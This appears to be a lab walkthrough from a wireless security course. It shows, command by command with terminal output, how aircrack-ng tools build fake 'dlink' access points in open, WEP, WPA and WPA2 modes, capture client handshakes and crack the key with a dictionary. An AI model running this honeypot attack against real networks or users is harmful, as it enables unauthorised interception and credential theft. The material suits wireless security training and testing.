#### Part 25: Mood Swings of a Wandering Wi-Fi Client

Connect the Alfa card

```sh
ubuntu32@u32:~$ ifconfig
enp0s3    Link encap:Ethernet  HWaddr 08:00:27:68:4e:d2
          inet addr:10.0.0.75  Bcast:10.0.0.255  Mask:255.255.255.0
          inet6 addr: 2601:644:8501:6c87:d6:ee6c:34ed:ca01/64 Scope:Global
          inet6 addr: 2601:644:8501:6c87:ed0f:7a37:35c:1844/64 Scope:Global
          inet6 addr: fe80::501c:ef3b:a4d3:8b6e/64 Scope:Link
          inet6 addr: 2601:644:8502:a52::56eb/128 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:89 errors:0 dropped:0 overruns:0 frame:0
          TX packets:187 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:11651 (11.6 KB)  TX bytes:22173 (22.1 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:125 errors:0 dropped:0 overruns:0 frame:0
          TX packets:125 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:10243 (10.2 KB)  TX bytes:10243 (10.2 KB)

wlx00c0ca923c89 Link encap:Ethernet  HWaddr 00:c0:ca:92:3c:89
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

ubuntu32@u32:~$
```

Put the card in monitor mode

```sh
ubuntu32@u32:~$ sudo airmon-ng
[sudo] password for ubuntu32:


Interface       Chipset         Driver

wlx00c0ca923c89         Realtek RTL8187L        rtl8187 - [phy0]

ubuntu32@u32:~$
```

Create 5 ```monitor``` mode interfaces

```sh
ubuntu32@u32:~$ sudo airmon-ng start wlx00c0ca923c89


Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
648	avahi-daemon
653	avahi-daemon
708	NetworkManager
841	dhclient
1319	wpa_supplicant


Interface	Chipset		Driver

wlx00c0ca923c89		Realtek RTL8187L	rtl8187 - [phy0]
				(monitor mode enabled on mon0)

ubuntu32@u32:~$ sudo airmon-ng start wlx00c0ca923c89


Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
648	avahi-daemon
653	avahi-daemon
708	NetworkManager
841	dhclient
1319	wpa_supplicant


Interface	Chipset		Driver

wlx00c0ca923c89		Realtek RTL8187L	rtl8187 - [phy0]
				(monitor mode enabled on mon1)
mon0		Realtek RTL8187L	rtl8187 - [phy0]

ubuntu32@u32:~$ sudo airmon-ng start wlx00c0ca923c89


Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
648	avahi-daemon
653	avahi-daemon
708	NetworkManager
841	dhclient
1319	wpa_supplicant


Interface	Chipset		Driver

wlx00c0ca923c89		Realtek RTL8187L	rtl8187 - [phy0]
				(monitor mode enabled on mon2)
mon0		Realtek RTL8187L	rtl8187 - [phy0]
mon1		Realtek RTL8187L	rtl8187 - [phy0]

ubuntu32@u32:~$ sudo airmon-ng start wlx00c0ca923c89


Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
648	avahi-daemon
653	avahi-daemon
708	NetworkManager
841	dhclient
1319	wpa_supplicant


Interface	Chipset		Driver

wlx00c0ca923c89		Realtek RTL8187L	rtl8187 - [phy0]
				(monitor mode enabled on mon3)
mon0		Realtek RTL8187L	rtl8187 - [phy0]
mon2		Realtek RTL8187L	rtl8187 - [phy0]
mon1		Realtek RTL8187L	rtl8187 - [phy0]

ubuntu32@u32:~$ sudo airmon-ng start wlx00c0ca923c89


Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
648	avahi-daemon
653	avahi-daemon
708	NetworkManager
841	dhclient
1319	wpa_supplicant


Interface	Chipset		Driver

wlx00c0ca923c89		Realtek RTL8187L	rtl8187 - [phy0]
				(monitor mode enabled on mon4)
mon0		Realtek RTL8187L	rtl8187 - [phy0]
mon3		Realtek RTL8187L	rtl8187 - [phy0]
mon2		Realtek RTL8187L	rtl8187 - [phy0]
mon1		Realtek RTL8187L	rtl8187 - [phy0]

ubuntu32@u32:~$ sudo airmon-ng


Interface	Chipset		Driver

wlx00c0ca923c89		Realtek RTL8187L	rtl8187 - [phy0]
mon0		Realtek RTL8187L	rtl8187 - [phy0]
mon3		Realtek RTL8187L	rtl8187 - [phy0]
mon2		Realtek RTL8187L	rtl8187 - [phy0]
mon1		Realtek RTL8187L	rtl8187 - [phy0]
mon4		Realtek RTL8187L	rtl8187 - [phy0]

ubuntu32@u32:~$
```

Create an ```OPN``` access point

```sh
ubuntu32@u32:~$ sudo airbase-ng --essid dlink -a aa:aa:aa:aa:aa:aa -c 1 mon1
15:10:42  Created tap interface at0
15:10:42  Trying to set MTU on at0 to 1500
15:10:42  Trying to set MTU on mon1 to 1800
15:10:42  Access Point with BSSID AA:AA:AA:AA:AA:AA started.
Error: Got channel -1, expected a value > 0.
```

Create an ```WEP``` enabled access point

```sh
ubuntu32@u32:~$ sudo airbase-ng --essid dlink -a bb:bb:bb:bb:bb:bb -c 1 -W 1 mon2
[sudo] password for ubuntu32:
For information, no action required: Using gettimeofday() instead of /dev/rtc
15:15:44  Created tap interface at1
15:15:44  Trying to set MTU on at1 to 1500
15:15:44  Trying to set MTU on mon2 to 1800

ti_set_mac failed: Cannot assign requested address
You most probably want to set the MAC of your TAP interface.
ifconfig <iface> hw ether BB:BB:BB:BB:BB:BB


15:15:44  Access Point with BSSID BB:BB:BB:BB:BB:BB started.
Error: Got channel -1, expected a value > 0.
```

Create an ```WPA-TKIP``` enabled access point

```sh
ubuntu32@u32:~$ sudo airbase-ng --essid dlink -a cc:cc:cc:cc:cc:cc -c 1 -W 1 -z 2 mon3
[sudo] password for ubuntu32:
For information, no action required: Using gettimeofday() instead of /dev/rtc
15:16:00  Created tap interface at2
15:16:00  Trying to set MTU on at2 to 1500
15:16:00  Trying to set MTU on mon3 to 1800
15:16:00  Access Point with BSSID CC:CC:CC:CC:CC:CC started.
Error: Got channel -1, expected a value > 0.
```

Create an ```WPA2-CCMP``` enabled access point

```sh
ubuntu32@u32:~$ sudo airbase-ng --essid dlink -a dd:dd:dd:dd:dd:dd -c 1 -W 1 -Z 4 mon4
[sudo] password for ubuntu32:
For information, no action required: Using gettimeofday() instead of /dev/rtc
15:17:00  Created tap interface at3
15:17:00  Trying to set MTU on at3 to 1500
15:17:00  Trying to set MTU on mon4 to 1800

ti_set_mac failed: Cannot assign requested address
You most probably want to set the MAC of your TAP interface.
ifconfig <iface> hw ether DD:DD:DD:DD:DD:DD


15:17:00  Access Point with BSSID DD:DD:DD:DD:DD:DD started.
Error: Got channel -1, expected a value > 0.
```

Use ```airodump-ng``` to check the access points

```sh
ubuntu32@u32:~/Desktop$ sudo airodump-ng --channel 1 --essid dlink mon0 --write honeypot
[sudo] password for ubuntu32:

 CH  1 ][ Elapsed: 4 mins ][ 2017-06-07 15:27 ][ fixed channel mon0: -1

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 DD:DD:DD:DD:DD:DD    0   0     2260        0    0   1  54   WPA2 CCMP   PSK dlink
 BB:BB:BB:BB:BB:BB    0   0     2260        0    0   1  54   WEP  WEP         dlink
 AA:AA:AA:AA:AA:AA    0   0     2242        0    0   1  54   OPN              dlink
 CC:CC:CC:CC:CC:CC    0   0     2260        0    0   1  54   WPA  TKIP   PSK  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   00:C0:CA:92:3C:89    0    0 - 1      0       33
```

The client searching for ```dlink``` will connect to any one access point created by us and give us ```honeypot-01.cap``` which we can use to crack the key using ```aircrack-ng```

```sh
ubuntu32@u32:~$ sudo aircrack-ng honeypot-01.cap -w dictionary.txt
```
